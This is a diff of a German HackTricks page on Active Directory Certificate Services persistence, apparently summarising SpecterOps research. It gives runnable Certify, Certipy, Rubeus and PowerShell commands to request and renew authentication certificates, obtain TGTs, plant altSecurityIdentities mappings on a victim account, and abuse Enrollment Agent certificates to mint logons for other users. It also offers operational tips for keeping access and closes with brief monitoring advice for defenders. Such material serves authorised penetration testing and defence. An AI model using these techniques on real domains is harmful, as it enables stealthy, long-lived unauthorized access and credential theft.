@@ -2,55 +2,131 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-**Dies ist eine kleine Zusammenfassung der Kapitel zur Maschinenpersistenz aus der großartigen Forschung von [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**
+**Dies ist eine kleine Zusammenfassung der Kapitel zur Kontinuität von Konten aus der großartigen Forschung von [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**
 
-## **Verstehen des Diebstahls aktiver Benutzeranmeldeinformationen mit Zertifikaten – PERSIST1**
+## Verständnis des Diebstahls aktiver Benutzeranmeldeinformationen mit Zertifikaten – PERSIST1
 
-In einem Szenario, in dem ein Benutzer ein Zertifikat anfordern kann, das die Domänenauthentifizierung ermöglicht, hat ein Angreifer die Möglichkeit, dieses Zertifikat **anzufordern** und **zu stehlen**, um **Persistenz** in einem Netzwerk aufrechtzuerhalten. Standardmäßig erlaubt die `User`-Vorlage in Active Directory solche Anfragen, obwohl sie manchmal deaktiviert sein kann.
+In einem Szenario, in dem ein Zertifikat, das die Domänenauthentifizierung ermöglicht, von einem Benutzer angefordert werden kann, hat ein Angreifer die Möglichkeit, dieses Zertifikat anzufordern und zu stehlen, um die Persistenz in einem Netzwerk aufrechtzuerhalten. Standardmäßig erlaubt die `User`-Vorlage in Active Directory solche Anfragen, obwohl sie manchmal deaktiviert sein kann.
 
-Mit einem Tool namens [**Certify**](https://github.com/GhostPack/Certify) kann man nach gültigen Zertifikaten suchen, die persistenten Zugriff ermöglichen:
+Mit [Certify](https://github.com/GhostPack/Certify) oder [Certipy](https://github.com/ly4k/Certipy) können Sie nach aktivierten Vorlagen suchen, die die Clientauthentifizierung ermöglichen, und dann eine anfordern:
 ```bash
+# Enumerate client-auth capable templates
 Certify.exe find /clientauth
-```
-Es wird hervorgehoben, dass die Stärke eines Zertifikats in seiner Fähigkeit liegt, **als der Benutzer** zu authentifizieren, dem es gehört, unabhängig von Passwortänderungen, solange das Zertifikat **gültig** bleibt.
 
-Zertifikate können über eine grafische Benutzeroberfläche mit `certmgr.msc` oder über die Befehlszeile mit `certreq.exe` angefordert werden. Mit **Certify** wird der Prozess zur Anforderung eines Zertifikats wie folgt vereinfacht:
-```bash
-Certify.exe request /ca:CA-SERVER\CA-NAME /template:TEMPLATE-NAME
+# Request a user cert from an Enterprise CA (current user context)
+Certify.exe request /ca:CA-SERVER\CA-NAME /template:User
+
+# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
+certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
 ```
-Nach erfolgreicher Anfrage wird ein Zertifikat zusammen mit seinem privaten Schlüssel im `.pem`-Format generiert. Um dies in eine `.pfx`-Datei umzuwandeln, die auf Windows-Systemen verwendbar ist, wird der folgende Befehl verwendet:
+Die Macht eines Zertifikats liegt in seiner Fähigkeit, sich als der Benutzer zu authentifizieren, dem es gehört, unabhängig von Passwortänderungen, solange das Zertifikat gültig bleibt.
+
+Sie können PEM in PFX konvertieren und es verwenden, um ein TGT zu erhalten:
 ```bash
+# Convert PEM returned by Certify to PFX
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
-```
-Die `.pfx`-Datei kann dann auf ein Zielsystem hochgeladen und mit einem Tool namens [**Rubeus**](https://github.com/GhostPack/Rubeus) verwendet werden, um ein Ticket Granting Ticket (TGT) für den Benutzer anzufordern, wodurch der Zugriff des Angreifers so lange verlängert wird, wie das Zertifikat **gültig** ist (typischerweise ein Jahr):
-```bash
-Rubeus.exe asktgt /user:harmj0y /certificate:C:\Temp\cert.pfx /password:CertPass!
-```
-Ein wichtiger Hinweis wird gegeben, wie diese Technik, kombiniert mit einer anderen Methode, die im Abschnitt **THEFT5** beschrieben ist, es einem Angreifer ermöglicht, dauerhaft den **NTLM-Hash** eines Kontos zu erhalten, ohne mit dem Local Security Authority Subsystem Service (LSASS) zu interagieren und aus einem nicht erhöhten Kontext, was eine stealthier Methode für den langfristigen Diebstahl von Anmeldeinformationen bietet.
 
-## **Maschinenpersistenz mit Zertifikaten erlangen - PERSIST2**
+# Use certificate for PKINIT and inject the TGT
+Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt
 
-Eine andere Methode besteht darin, das Maschinenkonto eines kompromittierten Systems für ein Zertifikat zu registrieren, wobei die Standardvorlage `Machine` verwendet wird, die solche Aktionen erlaubt. Wenn ein Angreifer erhöhte Berechtigungen auf einem System erlangt, kann er das **SYSTEM**-Konto verwenden, um Zertifikate anzufordern, was eine Form von **Persistenz** bietet:
+# Or with Certipy
+certipy auth -pfx user.pfx -dc-ip 10.0.0.10
+```
+> Hinweis: In Kombination mit anderen Techniken (siehe THEFT-Abschnitte) ermöglicht die zertifikatsbasierte Authentifizierung einen dauerhaften Zugriff, ohne LSASS zu berühren und sogar aus nicht erhöhten Kontexten.
+
+## Maschinenpersistenz mit Zertifikaten erlangen - PERSIST2
+
+Wenn ein Angreifer erhöhte Berechtigungen auf einem Host hat, kann er das Maschinenkonto des kompromittierten Systems für ein Zertifikat mit der Standardvorlage `Machine` registrieren. Die Authentifizierung als Maschine ermöglicht S4U2Self für lokale Dienste und kann eine dauerhafte Maschinenpersistenz bieten:
 ```bash
+# Request a machine certificate as SYSTEM
 Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine
+
+# Authenticate as the machine using the issued PFX
+Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
 ```
-Dieser Zugriff ermöglicht es dem Angreifer, sich als Maschinenkonto bei **Kerberos** zu authentifizieren und **S4U2Self** zu nutzen, um Kerberos-Diensttickets für jeden Dienst auf dem Host zu erhalten, was dem Angreifer effektiv dauerhaften Zugriff auf die Maschine gewährt.
+## Extending Persistence Through Certificate Renewal - PERSIST3
 
-## **Erweiterung der Persistenz durch Zertifikatserneuerung - PERSIST3**
+Das Ausnutzen der Gültigkeits- und Erneuerungszeiträume von Zertifikatvorlagen ermöglicht es einem Angreifer, langfristigen Zugriff zu behalten. Wenn Sie ein zuvor ausgestelltes Zertifikat und dessen privaten Schlüssel besitzen, können Sie es vor Ablauf erneuern, um ein frisches, langlebiges Credential zu erhalten, ohne zusätzliche Anforderungsartefakte, die mit dem ursprünglichen Prinzipal verbunden sind, zu hinterlassen.
+```bash
+# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
+# Provide the existing PFX and target the same CA/template when possible
+certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
+-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx
 
-Die letzte besprochene Methode beinhaltet die Nutzung der **Gültigkeits**- und **Erneuerungszeiträume** von Zertifikatvorlagen. Durch die **Erneuerung** eines Zertifikats vor dessen Ablauf kann ein Angreifer die Authentifizierung bei Active Directory aufrechterhalten, ohne zusätzliche Ticketanmeldungen, die Spuren auf dem Zertifizierungsstellen- (CA) Server hinterlassen könnten.
+# Native Windows renewal with certreq
+# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
+certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
+```
+> Betrieblicher Tipp: Verfolgen Sie die Laufzeiten von von Angreifern gehaltenen PFX-Dateien und erneuern Sie diese frühzeitig. Eine Erneuerung kann auch dazu führen, dass aktualisierte Zertifikate die moderne SID-Mapping-Erweiterung enthalten, wodurch sie unter strengeren DC-Mapping-Regeln verwendbar bleiben (siehe nächster Abschnitt).
 
-### Zertifikatserneuerung mit Certify 2.0
+## Pflanzung expliziter Zertifikat-Mappings (altSecurityIdentities) – PERSIST4
 
-Beginnend mit **Certify 2.0** ist der Erneuerungsworkflow vollständig automatisiert durch den neuen `request-renew` Befehl. Angesichts eines zuvor ausgestellten Zertifikats (im **Base-64 PKCS#12** Format) kann ein Angreifer es erneuern, ohne mit dem ursprünglichen Eigentümer zu interagieren – perfekt für heimliche, langfristige Persistenz:
+Wenn Sie auf das Attribut `altSecurityIdentities` eines Zielkontos schreiben können, können Sie ein von einem Angreifer kontrolliertes Zertifikat explizit diesem Konto zuordnen. Dies bleibt auch nach Passwortänderungen bestehen und bleibt bei Verwendung starker Mapping-Formate unter der modernen DC-Durchsetzung funktionsfähig.
+
+Hochrangiger Ablauf:
+
+1. Erhalten oder stellen Sie ein Client-Auth-Zertifikat aus, das Sie kontrollieren (z. B. melden Sie sich mit der `User`-Vorlage als sich selbst an).
+2. Extrahieren Sie einen starken Identifikator aus dem Zertifikat (Issuer+Serial, SKI oder SHA1-PublicKey).
+3. Fügen Sie eine explizite Zuordnung im `altSecurityIdentities` des Opferprinzips unter Verwendung dieses Identifikators hinzu.
+4. Authentifizieren Sie sich mit Ihrem Zertifikat; der DC ordnet es über die explizite Zuordnung dem Opfer zu.
+
+Beispiel (PowerShell) unter Verwendung einer starken Issuer+Serial-Zuordnung:
 ```powershell
-Certify.exe request-renew --ca SERVER\\CA-NAME \
---cert-pfx MIACAQMwgAYJKoZIhvcNAQcBoIAkgA...   # original PFX
+# Example values - reverse the issuer DN and serial as required by AD mapping format
+$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
+$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
+$Map     = "X509:<I>$Issuer<SR>$SerialR"
+
+# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
+Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
 ```
-Der Befehl gibt ein neues PFX zurück, das für einen weiteren vollständigen Lebenszyklus gültig ist, sodass Sie weiterhin authentifizieren können, selbst nachdem das erste Zertifikat abgelaufen oder widerrufen wurde.
+Dann authentifizieren Sie sich mit Ihrem PFX. Certipy wird ein TGT direkt abrufen:
+```bash
+certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
+```
+Notizen
+- Verwenden Sie nur starke Zuordnungstypen: X509IssuerSerialNumber, X509SKI oder X509SHA1PublicKey. Schwache Formate (Subject/Issuer, nur Subject, RFC822-E-Mail) sind veraltet und können durch die DC-Richtlinie blockiert werden.
+- Die Zertifikatskette muss zu einem von der DC vertrauenswürdigen Root führen. Unternehmens-CAs in NTAuth sind typischerweise vertrauenswürdig; einige Umgebungen vertrauen auch öffentlichen CAs.
 
-## References
+Für weitere Informationen zu schwachen expliziten Zuordnungen und Angriffswegen siehe:
 
-- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
+{{#ref}}
+domain-escalation.md
+{{#endref}}
+
+## Enrollment Agent als Persistenz – PERSIST5
+
+Wenn Sie ein gültiges Zertifikat für einen Certificate Request Agent/Enrollment Agent erhalten, können Sie nach Belieben neue, anmeldefähige Zertifikate im Namen von Benutzern erstellen und den Agenten-PFX offline als Persistenz-Token aufbewahren. Missbrauchs-Workflow:
+```bash
+# Request an Enrollment Agent cert (requires template rights)
+Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"
+
+# Mint a user cert on behalf of another principal using the agent PFX
+Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
+/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass
+
+# Or with Certipy
+certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
+-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
+```
+Die Widerrufung des Agentenzertifikats oder der Berechtigungen für Vorlagen ist erforderlich, um diese Persistenz zu beseitigen.
+
+## 2025 Starke Durchsetzung der Zertifikatzuordnung: Auswirkungen auf die Persistenz
+
+Microsoft KB5014754 führte die starke Durchsetzung der Zertifikatzuordnung auf Domänencontrollern ein. Seit dem 11. Februar 2025 verwenden DCs standardmäßig die vollständige Durchsetzung und lehnen schwache/mehrdeutige Zuordnungen ab. Praktische Auswirkungen:
+
+- Zertifikate vor 2022, die die SID-Zuordnungs-Erweiterung nicht haben, können bei vollständiger Durchsetzung durch DCs an impliziter Zuordnung scheitern. Angreifer können den Zugriff aufrechterhalten, indem sie entweder Zertifikate über AD CS erneuern (um die SID-Erweiterung zu erhalten) oder eine starke explizite Zuordnung in `altSecurityIdentities` (PERSIST4) einfügen.
+- Explizite Zuordnungen mit starken Formaten (Issuer+Serial, SKI, SHA1-PublicKey) funktionieren weiterhin. Schwache Formate (Issuer/Subject, nur Subject, RFC822) können blockiert werden und sollten für Persistenz vermieden werden.
+
+Administratoren sollten überwachen und alarmieren bei:
+- Änderungen an `altSecurityIdentities` und der Ausstellung/Erneuerung von Enrollment-Agent- und Benutzerzertifikaten.
+- CA-Ausgabeloggen für Anfragen im Namen von und ungewöhnlichen Erneuerungsmustern.
+
+## Referenzen
+
+- Microsoft. KB5014754: Änderungen bei der zertifikatbasierten Authentifizierung auf Windows-Domänencontrollern (Durchsetzungszeitplan und starke Zuordnungen).
+https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
+- Certipy Wiki – Befehlsreferenz (`req -renew`, `auth`, `shadow`).
+https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
 
 {{#include ../../../banners/hacktricks-training.md}}
